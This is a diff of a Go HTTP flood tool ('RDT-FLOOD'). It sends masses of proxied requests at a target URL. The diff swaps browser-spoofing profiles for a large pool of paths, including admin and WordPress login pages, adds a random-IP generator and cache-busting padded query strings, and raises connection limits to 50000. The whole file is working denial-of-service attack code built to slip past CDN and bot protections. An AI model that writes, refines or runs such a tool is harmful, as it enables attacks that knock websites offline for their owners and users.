@@ -41,32 +41,10 @@ type Spof struct {
 }
 
 var (
-	Chrome     = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
-	Firefox    = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q=", "https://www.bing.com/search?q="}
-	Edge       = []string{"https://www.bing.com/search?q=", "https://www.google.com/search?q="}
-	Safari     = []string{"https://www.google.com/search?q="}
-	Opera      = []string{"https://www.google.com/search?q=", "https://www.yahoo.com/search?p=", "https://www.bing.com/search?q="}
-	Brave      = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	Vivaldi    = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q=", "https://www.duckduckgo.com/?q="}
-	Tor        = []string{"https://www.duckduckgo.com/?q=", "https://www.google.com/search?q="}
-	PaleMoon   = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	Waterfox   = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	Epic       = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	Slim       = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
-	Maxthon    = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
-	Avant      = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
-	SeaMonkey  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	IceDragon  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	Cyberfox   = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	Samsung    = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
-	DuckGo     = []string{"https://www.duckduckgo.com/?q=", "https://www.google.com/search?q="}
-	OperaMini  = []string{"https://www.google.com/search?q=", "https://www.yahoo.com/search?p="}
-	FFMobile   = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	BraveMob   = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	Epiphany   = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	Midori     = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	Konqueror  = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
-	Falkon     = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q="}
+	Chrome  = []string{"https://www.google.com/search?q=", "https://www.bing.com/search?q="}
+	Firefox = []string{"https://www.google.com/search?q=", "https://www.duckduckgo.com/?q=", "https://www.bing.com/search?q="}
+	Edge    = []string{"https://www.bing.com/search?q=", "https://www.google.com/search?q="}
+	Safari  = []string{"https://www.google.com/search?q="}
 )
 
 var profiles = []Spof{
@@ -101,216 +79,6 @@ var profiles = []Spof{
 		Refs:        Edge,
 	},
 	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/130.0.0.0",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="144", "Opera";v="130", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?0",
-		SecChUaPlat: "Windows",
-		Refs:        Opera,
-	},
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Brave/144.0.0.0",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="144", "Brave";v="144", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?0",
-		SecChUaPlat: "Windows",
-		Refs:        Brave,
-	},
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Vivaldi/7.1.3570.47",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="144", "Vivaldi";v="7.1", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?0",
-		SecChUaPlat: "Windows",
-		Refs:        Vivaldi,
-	},
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/131.0.0.0 (Edition GX)",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="144", "Opera GX";v="131", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?0",
-		SecChUaPlat: "Windows",
-		Refs:        Opera,
-	},
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Arc/1.0.0",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="146", "Arc";v="1", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?0",
-		SecChUaPlat: "Windows",
-		Refs:        Chrome,
-	},
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0 TorBrowser/12.5.3",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     "",
-		SecChUaMov:  "",
-		SecChUaPlat: "",
-		Refs:        Tor,
-	},
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Goanna/6.4 Firefox/68.0 PaleMoon/33.5.1",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     "",
-		SecChUaMov:  "",
-		SecChUaPlat: "",
-		Refs:        PaleMoon,
-	},
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0 Waterfox/6.5.2",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     "",
-		SecChUaMov:  "",
-		SecChUaPlat: "",
-		Refs:        Waterfox,
-	},
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Epic/146.0.0.0",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="146", "Epic";v="146", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?0",
-		SecChUaPlat: "Windows",
-		Refs:        Epic,
-	},
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 SlimBrowser/15.0.0.0",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="146", "SlimBrowser";v="15", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?0",
-		SecChUaPlat: "Windows",
-		Refs:        Slim,
-	},
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Maxthon/7.1.9.3000",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="144", "Maxthon";v="7.1", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?0",
-		SecChUaPlat: "Windows",
-		Refs:        Maxthon,
-	},
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Avant/2024.1.0",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="145", "Avant";v="2024", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?0",
-		SecChUaPlat: "Windows",
-		Refs:        Avant,
-	},
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0 SeaMonkey/2.53.19",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     "",
-		SecChUaMov:  "",
-		SecChUaPlat: "",
-		Refs:        SeaMonkey,
-	},
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0 IceDragon/115.0",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     "",
-		SecChUaMov:  "",
-		SecChUaPlat: "",
-		Refs:        IceDragon,
-	},
-	{
-		UA:          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0 Cyberfox/52.9.1",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     "",
-		SecChUaMov:  "",
-		SecChUaPlat: "",
-		Refs:        Cyberfox,
-	},
-	{
-		UA:          "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="146", "Google Chrome";v="146", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?1",
-		SecChUaPlat: "Android",
-		Refs:        Chrome,
-	},
-	{
-		UA:          "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/123.0.0.0 Mobile Safari/537.36",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="123", "Samsung Internet";v="25", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?1",
-		SecChUaPlat: "Android",
-		Refs:        Samsung,
-	},
-	{
-		UA:          "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) DuckDuckGo/5.0 Chrome/146.0.0.0 Mobile Safari/537.36",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="146", "DuckDuckGo";v="5", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?1",
-		SecChUaPlat: "Android",
-		Refs:        DuckGo,
-	},
-	{
-		UA:          "Opera/9.80 (Android; Opera Mini/18.0.2254/93.577; U; en) Presto/2.12.423 Version/12.16",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate",
-		SecChUa:     "",
-		SecChUaMov:  "",
-		SecChUaPlat: "",
-		Refs:        OperaMini,
-	},
-	{
-		UA:          "Mozilla/5.0 (Android 15; Mobile; rv:136.0) Gecko/136.0 Firefox/136.0",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     "",
-		SecChUaMov:  "",
-		SecChUaPlat: "",
-		Refs:        FFMobile,
-	},
-	{
-		UA:          "Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36 Brave/146.0.0.0",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="146", "Brave";v="146", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?1",
-		SecChUaPlat: "Android",
-		Refs:        BraveMob,
-	},
-	{
 		UA:          "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
 		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
 		Lang:        "en-US,en;q=0.9",
@@ -320,100 +88,62 @@ var profiles = []Spof{
 		SecChUaPlat: "",
 		Refs:        Safari,
 	},
-	{
-		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     "",
-		SecChUaMov:  "",
-		SecChUaPlat: "",
-		Refs:        Safari,
-	},
-	{
-		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Gecko/20100101 Firefox/136.0",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     "",
-		SecChUaMov:  "",
-		SecChUaPlat: "",
-		Refs:        Firefox,
-	},
-	{
-		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Brave/145.0.0.0",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="145", "Brave";v="145", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?0",
-		SecChUaPlat: "macOS",
-		Refs:        Brave,
-	},
-	{
-		UA:          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Vivaldi/7.2.3622.47",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="144", "Vivaldi";v="7.2", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?0",
-		SecChUaPlat: "macOS",
-		Refs:        Vivaldi,
-	},
-	{
-		UA:          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     `"Chromium";v="145", "Google Chrome";v="145", "Not?A_Brand";v="99"`,
-		SecChUaMov:  "?0",
-		SecChUaPlat: "Linux",
-		Refs:        Chrome,
-	},
-	{
-		UA:          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) Falkon/24.08.3 QtWebEngine/6.7.2 Safari/538.1",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     "",
-		SecChUaMov:  "",
-		SecChUaPlat: "",
-		Refs:        Falkon,
-	},
-	{
-		UA:          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Epiphany/45.3 Safari/605.1.15",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     "",
-		SecChUaMov:  "",
-		SecChUaPlat: "",
-		Refs:        Epiphany,
-	},
-	{
-		UA:          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Midori/11.3 Safari/537.36",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     "",
-		SecChUaMov:  "",
-		SecChUaPlat: "",
-		Refs:        Midori,
-	},
-	{
-		UA:          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) Konqueror/4.14.38 Safari/537.21",
-		Accept:      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-		Lang:        "en-US,en;q=0.9",
-		Encoding:    "gzip, deflate, br",
-		SecChUa:     "",
-		SecChUaMov:  "",
-		SecChUaPlat: "",
-		Refs:        Konqueror,
-	},
 }
 
-var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
-var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
+var PATH_POOL = []string{
+	"/", "/index.html", "/favicon.ico", "/robots.txt", "/sitemap.xml", "/ads.txt", "/app-ads.txt",
+	"/api/health", "/api/v1/status", "/api/v2/ping", "/api/v3/check", "/api/v4/heartbeat", "/api/v5/live", "/api/v6/ready",
+	"/api/users", "/api/users/login", "/api/users/register", "/api/users/profile", "/api/users/settings", "/api/users/avatar",
+	"/api/products", "/api/products/all", "/api/products/category", "/api/products/detail", "/api/products/search", "/api/products/recommend",
+	"/api/orders", "/api/orders/create", "/api/orders/status", "/api/orders/history", "/api/orders/cancel", "/api/orders/track",
+	"/api/payment", "/api/payment/checkout", "/api/payment/verify", "/api/payment/callback", "/api/payment/webhook",
+	"/api/cart", "/api/cart/add", "/api/cart/remove", "/api/cart/update", "/api/cart/clear", "/api/cart/checkout",
+	"/api/reviews", "/api/reviews/add", "/api/reviews/delete", "/api/reviews/update", "/api/reviews/list",
+	"/api/notifications", "/api/notifications/unread", "/api/notifications/mark-read", "/api/notifications/clear",
+	"/api/messages", "/api/messages/send", "/api/messages/inbox", "/api/messages/outbox", "/api/messages/delete",
+	"/api/friends", "/api/friends/add", "/api/friends/remove", "/api/friends/list", "/api/friends/requests",
+	"/api/groups", "/api/groups/create", "/api/groups/join", "/api/groups/leave", "/api/groups/members", "/api/groups/delete",
+	"/api/analytics", "/api/analytics/track", "/api/analytics/report", "/api/analytics/dashboard", "/api/analytics/export",
+	"/api/settings", "/api/settings/update", "/api/settings/theme", "/api/settings/notifications", "/api/settings/privacy",
+	"/api/uploads", "/api/uploads/image", "/api/uploads/file", "/api/uploads/avatar", "/api/uploads/delete",
+	"/api/download", "/api/download/file", "/api/download/resume", "/api/download/cancel",
+	"/api/search", "/api/search/all", "/api/search/users", "/api/search/products", "/api/search/history",
+	"/wp-admin/", "/wp-admin/index.php", "/wp-admin/admin.php", "/wp-admin/post.php", "/wp-admin/edit.php",
+	"/wp-admin/plugins.php", "/wp-admin/themes.php", "/wp-admin/users.php", "/wp-admin/tools.php", "/wp-admin/options-general.php",
+	"/wp-admin/upload.php", "/wp-admin/media-upload.php", "/wp-admin/link-manager.php", "/wp-admin/edit-comments.php",
+	"/wp-login.php", "/wp-register.php", "/wp-signup.php", "/wp-activate.php", "/wp-comments-post.php",
+	"/admin", "/admin/login", "/admin/dashboard", "/admin/users", "/admin/settings", "/admin/logout",
+	"/admin/panel", "/admin/control", "/admin/management", "/admin/analytics", "/admin/reports",
+	"/user", "/user/profile", "/user/settings", "/user/dashboard", "/user/activity", "/user/friends",
+	"/register", "/login", "/logout", "/forgot-password", "/reset-password", "/change-password",
+	"/verify-email", "/confirm-email", "/unsubscribe", "/terms", "/privacy", "/cookie-policy",
+	"/product", "/products", "/product/new", "/product/popular", "/product/trending", "/product/discount",
+	"/category", "/categories", "/category/electronics", "/category/fashion", "/category/food", "/category/books",
+	"/category/sports", "/category/music", "/category/games", "/category/movies", "/category/travel",
+	"/shop", "/shop/all", "/shop/new", "/shop/sale", "/shop/clearance", "/shop/favorites",
+	"/cart", "/checkout", "/payment", "/success", "/cancel", "/order-tracking",
+	"/blog", "/blog/posts", "/blog/categories", "/blog/authors", "/blog/tags", "/blog/archive",
+	"/blog/new", "/blog/popular", "/blog/trending", "/blog/recent", "/blog/featured",
+	"/article", "/articles", "/article/new", "/article/popular", "/article/trending",
+	"/news", "/news/latest", "/news/popular", "/news/category", "/news/breaking",
+	"/event", "/events", "/event/upcoming", "/event/past", "/event/register",
+	"/contact", "/about", "/about-us", "/about/team", "/about/careers", "/about/history",
+	"/team", "/teams", "/team/members", "/team/join", "/team/contact",
+	"/career", "/careers", "/career/jobs", "/career/apply", "/career/internship",
+	"/faq", "/help", "/support", "/support/tickets", "/support/chat", "/support/email",
+	"/download", "/downloads", "/download/latest", "/download/stable", "/download/beta",
+	"/community", "/forum", "/discuss", "/discussion", "/thread", "/topic",
+	"/media", "/gallery", "/photos", "/videos", "/audio", "/podcast",
+	"/services", "/pricing", "/plans", "/subscription", "/premium", "/upgrade",
+	"/test", "/demo", "/sample", "/example", "/sandbox", "/staging",
+	"/docs", "/documentation", "/api-docs", "/guide", "/tutorial", "/examples",
+	"/dashboard", "/dashboard/overview", "/dashboard/stats", "/dashboard/activity", "/dashboard/reports",
+	"/app", "/app/home", "/app/settings", "/app/profile", "/app/notifications", "/app/messages",
+}
+
+var CBP = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random", "nonce", "token", "hash", "sig", "key", "secret"}
+
+var COOKIES = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm", "_gat", "_fbp", "_gcl_au", "_hjid", "_hjIncludedInSample"}
 
 type CLI struct {
 	client *http.Client
@@ -422,6 +152,7 @@ type CLI struct {
 
 func init() {
 	runtime.GOMAXPROCS(runtime.NumCPU())
+	rand.Seed(time.Now().UnixNano())
 }
 
 func RST(rng *rand.Rand, length int) string {
@@ -431,6 +162,14 @@ func RST(rng *rand.Rand, length int) string {
 		b[i] = chars[rng.Intn(len(chars))]
 	}
 	return string(b)
+}
+
+func RIP() string {
+	return fmt.Sprintf("%d.%d.%d.%d", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
+}
+
+func getRandomPath() string {
+	return PATH_POOL[rand.Intn(len(PATH_POOL))]
 }
 
 var customCookie string
@@ -453,6 +192,9 @@ func main() {
 	if len(os.Args) >= 4 {
 		customCookie = os.Args[3]
 	}
+
+	parsedTarget, _ := url.Parse(tgt)
+	targetHost := parsedTarget.Host
 
 	var proxies []*url.URL
 	file, err := os.Open("proxy.txt")
@@ -484,8 +226,8 @@ func main() {
 				KeepAlive: Alive,
 			}).DialContext,
 			DisableKeepAlives:      false,
-			MaxIdleConns:           0,
-			MaxIdleConnsPerHost:    0,
+			MaxIdleConns:           50000,
+			MaxIdleConnsPerHost:    50000,
 			MaxConnsPerHost:        0,
 			IdleConnTimeout:        Alive,
 			TLSClientConfig: &tls.Config{
@@ -504,7 +246,7 @@ func main() {
 			},
 			ForceAttemptHTTP2:     true,
 			DisableCompression:    false,
-			TLSHandshakeTimeout:   4 * time.Second,
+			TLSHandshakeTimeout:   5 * time.Second,
 			ResponseHeaderTimeout: 3 * time.Second,
 			ExpectContinueTimeout: 1 * time.Second,
 		}
@@ -522,23 +264,20 @@ func main() {
 		wcs[i] = CLI{client: client, ip: ip}
 	}
 
-	parsedTarget, _ := url.Parse(tgt)
-	targetHost := parsedTarget.Host
-
 	fmt.Printf("\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
-        fmt.Printf("ޗ | Author | Diz Flyze\n")
-        fmt.Printf("ޗ | Target | %s\n", tgt)
-        fmt.Printf("ޗ | Time   | %d/s\n", dur)
-        fmt.Printf("ޗ | Proxy  | %d\n", len(proxies))
-        fmt.Printf("ޗ | Conc   | %d\n", wrk)
-        fmt.Printf("ޗ | Method | RDT-FLOOD\n")
-        fmt.Printf("ޗ | Ulimit | 1048576\n")
-        if customCookie != "" {
-                fmt.Printf("ޗ | Cookie | %s\n", customCookie[:30])
-        } else {
-                fmt.Printf("ޗ | Cookie | False\n")
-        }
-        fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\n")
+	fmt.Printf("ޗ | Author | Diz Flyze\n")
+	fmt.Printf("ޗ | Target | %s\n", tgt)
+	fmt.Printf("ޗ | Time   | %d/s\n", dur)
+	fmt.Printf("ޗ | Proxy  | %d\n", len(proxies))
+	fmt.Printf("ޗ | Conc   | %d\n", wrk)
+	fmt.Printf("ޗ | Method | RDT-FLOOD\n")
+	fmt.Printf("ޗ | Ulimit | 1048576\n")
+	if customCookie != "" {
+		fmt.Printf("ޗ | Cookie | %s\n", customCookie[:30])
+	} else {
+		fmt.Printf("ޗ | Cookie | False\n")
+	}
+	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\n")
 
 	ctx, cancel := context.WithCancel(context.Background())
 	var wg sync.WaitGroup
@@ -567,17 +306,14 @@ func main() {
 						prof := profiles[subRng.Intn(len(profiles))]
 
 						baseURL := strings.TrimRight(tgt, "/")
-						pathSegments := []string{}
+						path := getRandomPath()
 						if subRng.Intn(3) == 0 {
-							for j := 0; j < 1+subRng.Intn(3); j++ {
-								pathSegments = append(pathSegments, RST(subRng, 4+subRng.Intn(8)))
-							}
-							pathSegments = append(pathSegments, RST(subRng, 4+subRng.Intn(8))+"."+RST(subRng, 2))
+							path += "/" + RST(subRng, 4+subRng.Intn(8))
 						}
-						reqURL := baseURL
-						if len(pathSegments) > 0 {
-							reqURL += "/" + strings.Join(pathSegments, "/")
+						if subRng.Intn(3) == 0 {
+							path += "/" + RST(subRng, 4+subRng.Intn(8))
 						}
+						reqURL := baseURL + path
 
 						if strings.Contains(reqURL, "?") {
 							reqURL += "&"
@@ -589,59 +325,82 @@ func main() {
 						reqURL += param + "=" + strconv.FormatInt(subRng.Int63(), 10)
 						reqURL += "&_=" + strconv.FormatInt(time.Now().UnixNano(), 10)
 						reqURL += "&cb=" + strconv.FormatInt(subRng.Int63(), 16)
-						reqURL += "&big=" + strings.Repeat("x", 1024+subRng.Intn(1024))
 						if subRng.Intn(2) == 0 {
-							reqURL += "&" + RST(subRng, 16) + "=" + strings.Repeat("x", 2048+subRng.Intn(2048))
+							reqURL += "&big=" + strings.Repeat("x", 1024+subRng.Intn(1024))
 						}
 						if subRng.Intn(3) == 0 {
-							reqURL += "&" + RST(subRng, 8) + "=" + RST(subRng, 32)
+							reqURL += "&" + RST(subRng, 8) + "=" + RST(subRng, 12)
 						}
 						if subRng.Intn(2) == 0 {
-							reqURL += "&" + RST(subRng, 10) + "=" + strconv.FormatInt(subRng.Int63(), 36)
+							reqURL += "&" + RST(subRng, 10) + "=" + strings.Repeat("y", 512+subRng.Intn(512))
+						}
+						if subRng.Intn(2) == 0 {
+							reqURL += "&nonce=" + strconv.FormatInt(subRng.Int63(), 36)
 						}
 
 						req, _ := http.NewRequest("GET", reqURL, nil)
 
